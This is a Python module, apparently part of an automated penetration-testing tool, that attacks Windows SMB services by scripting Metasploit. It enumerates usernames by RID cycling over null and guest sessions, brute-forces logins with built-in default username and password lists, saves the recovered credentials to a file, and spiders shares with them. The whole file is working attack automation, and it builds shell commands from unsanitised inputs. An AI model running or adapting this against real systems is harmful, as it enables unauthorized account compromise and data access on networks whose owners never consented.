import subprocess
import re
from mods.mod_utils import *
import os

smb_users = ["admin","user","manager","supervisor","administrator","test","it","backup","lab","demo","smb"]
smb_passwords = ["password","admin","administrator","backup","test","lab","demo"]
domain = '.'
credentials = []


def export_wordlists():
    with open('smb_users.txt', 'w') as file:
        file.write('\n'.join(smb_users))
        file.close()
        ulist = 'common'
        if ('it' not in smb_users):
            ulist = 'founded'
        printc(f'[+] Exported {ulist} users list to smb_users.txt', GREEN)
    
    with open('smb_pass.txt', 'w') as file:
        file.write('\n'.join(smb_passwords))
        file.close()


def export_credentials():
    with open('smb_credentials.txt', 'w') as file:
        file.write('\n'.join(credentials))
        file.close()
        printc('[+] Credentials stored in smb_credentials.txt', GREEN)


def rid_cycling(target, user="Guest", passw="", domain="."):
    cmd = f'msfconsole -q -x "use scanner/smb/smb_lookupsid;set RHOSTS {target};set SMBUser {user};set SMBPass {passw};set MinRID 500;set MaxRID 5000;set THREADS 10;set SMBDomain {domain};run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return
    if output:
        if ('USER' in output):
            rid_cycling_parse(output, cmd)


def rid_cycling_parse(output, cmd):
    global domain
    global smb_users

    print_banner('445')
    print('[!]', cmd)
    printc('[+] RID Cycling Attack to get Usernames', GREEN)
    print('')

    temp_users = []

    for line in output.splitlines():
        if ('DOMAIN' in line) and ('LOCAL' in line) and (domain == '.'):
            domain = re.findall('LOCAL.*DOMAIN\((.*) -', line)[0]
            printc(f'[+] Domain: {domain}', BLUE)
        if ('USER' in line):
            user = re.findall('USER=(.*)\sRID', line)[0]
            printc(f'[+] {user}', BLUE)
            temp_users.append(user)
    if len(temp_users) > 0:
        smb_users = temp_users


def bruteforce(target, port):
    global credentials
    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set SMBDomain {domain};set USER_AS_PASS true;set BLANK_PASSWORDS true;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return

    if output:
        if ('[+]' in output):
            print_banner('445')
            print('[!]', cmd)
            printc('[+] Creds Found!!!', GREEN)
            print('')
            for line in output.splitlines():
                creds = re.findall("Success:\s\'(.*)\'", line)
                if creds:
                    creds = creds[0].split('\\')[1]
                    if (creds.split(':')[1] == ''): continue
                    printc(f'[+] {creds}', BLUE)
                    credentials.append(creds)
    export_credentials()


def enumerate_shares(target, user='Guest', passw='', domain='.'):
    cmd = f'msfconsole -q -x "use scanner/smb/smb_enumshares;set RHOSTS {target};set SMBPass {passw};set SMBUser {user};set SMBDomain {domain};set LogSpider 0;set MaxDepth 0;set ShowFiles true;set SpiderShares true;run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return

    if output:
        if ('[+]' in output):
            print_banner('445')
            print('[!]', cmd)
            print('[!] Enumerating Shares.')
            print('')
            print(output)


def handle_smb(target, port):
    len_default_users = len(smb_users)

    # RID CYCLING AS NULL
    rid_cycling(target, user='')
    # RID CYCLING AS GUEST
    if len_default_users == len(smb_users):
        rid_cycling(target)

    export_wordlists()
    # BRUTEFORCE LOGIN
    bruteforce(target, port)

    if (len_default_users == len(smb_users)) and (len(credentials)>0):
        for cred in credentials:
            user, passw = cred.split(':')[:2]
            rid_cycling(target, user, passw, domain)

    # ENUMERATE SHARES
    # SHARES AS GUEST
    enumerate_shares(target)
    # SHARES AS NULL
    enumerate_shares(target, user='')
    # SHARES WITH CREDS
    if (len(credentials)>0):
        for cred in credentials:
            user, passw = cred.split(':')[:2]
            enumerate_shares(target, user, passw, domain)

    try:
        os.remove('smb_pass.txt')
    except Exception as e:
        printc(f'[-] {e}', RED)